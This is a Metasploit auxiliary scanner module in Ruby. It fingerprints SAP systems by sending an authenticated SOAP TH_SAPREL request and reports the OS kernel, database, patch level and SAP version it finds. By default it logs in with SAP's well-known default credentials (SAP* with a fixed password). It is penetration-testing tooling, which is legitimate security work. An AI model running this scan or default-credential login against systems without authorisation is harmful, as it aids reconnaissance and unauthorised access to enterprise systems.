##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require "msf/core"

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure',
      'Description' => %q{
          This module attempts to identify software, OS and DB versions through the SAP
        function TH_SAPREL using the /sap/bc/soap/rfc SOAP service.
      },
      'References' =>
        [
          [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
        ],
      'Author' =>
        [
          'Agnivesh Sathasivam',
          'nmonkee'
        ],
      'License' => MSF_LICENSE
      )

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('CLIENT', [true, 'SAP Client', '001']),
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992'])
      ], self.class)
  end

  def run_host(ip)

    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    data << '<env:Body>'
    data << '<n1:TH_SAPREL xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '</n1:TH_SAPREL>'
    data << '</env:Body>'
    data << '</env:Envelope>'

    print_status("[SAP] #{ip}:#{rport} - sending SOAP TH_SAPREL request")

    begin
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
        'method' => 'POST',
        'data' => data,
        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
        'ctype' => 'text/xml; charset=UTF-8',
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'headers' =>{
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
        }
      })
      if res and res.code == 200
        kern_comp_on = $1 if res.body =~ /<KERN_COMP_ON>(.*)<\/KERN_COMP_ON>/i
        kern_comp_time = $1 if res.body =~ /<KERN_COMP_TIME>(.*)<\/KERN_COMP_TIME>/i
        kern_dblib = $1 if res.body =~ /<KERN_DBLIB>(.*)<\/KERN_DBLIB>/i
        kern_patchlevel = $1 if res.body =~ /<KERN_PATCHLEVEL>(.*)<\/KERN_PATCHLEVEL>/i
        kern_rel =  $1 if res.body =~ /<KERN_REL>(.*)<\/KERN_REL>/i
        saptbl = Msf::Ui::Console::Table.new(
          Msf::Ui::Console::Table::Style::Default,
          'Header' => "[SAP] System Info",
          'Prefix' => "\n",
          'Postfix' => "\n",
          'Indent' => 1,
          'Columns' =>
            [
              "Info",
              "Value"
            ])
        saptbl << [ "OS Kernel version", kern_comp_on ]
        saptbl << [ "SAP compile time", kern_comp_time ]
        saptbl << [ "DB version", kern_dblib ]
        saptbl << [ "SAP patch level", kern_patchlevel ]
        saptbl << [ "SAP Version", kern_rel ]
        print(saptbl.to_s)

        report_note(
          :host => ip,
          :proto => 'tcp',
          :port => rport,
          :sname => 'sap',
          :type => 'os.kernel.version',
          :data => "OS Kernel version: #{kern_comp_on}"
        )

        report_note(
          :host => ip,
          :proto => 'tcp',
          :port => rport,
          :sname => 'sap',
          :type => 'sap.time.compile',
          :data => "SAP compile time: #{kern_comp_time}"
        )

        report_note(
          :host => ip,
          :proto => 'tcp',
          :port => rport,
          :sname => 'sap',
          :type => 'sap.db.version',
          :data => "DB version: #{kern_dblib}"
        )

        report_note(
          :host => ip,
          :proto => 'tcp',
          :port => rport,
          :sname => 'sap',
          :type => 'sap.version.patch_level',
          :data => "SAP patch level: #{kern_patchlevel}"
        )

        report_note(
          :host => ip,
          :proto => 'tcp',
          :port => rport,
          :type => 'sap.version',
          :data => "SAP Version: #{kern_rel}"
        )

      elsif res and res.code == 500
        response = res.body
        error.push(response.scan(%r{<message>(.*?)</message>}))
        err = error.join().chomp
        print_error("[SAP] #{ip}:#{rport} - #{err.gsub('&#39;','\'')}")
        return
      else
        print_error("[SAP] #{ip}:#{rport} - error message: " + res.code.to_s + " " + res.message) if res
        return
      end
    rescue ::Rex::ConnectionError
      print_error("[SAP] #{ip}:#{rport} - Unable to connect")
      return
    end

  end
end
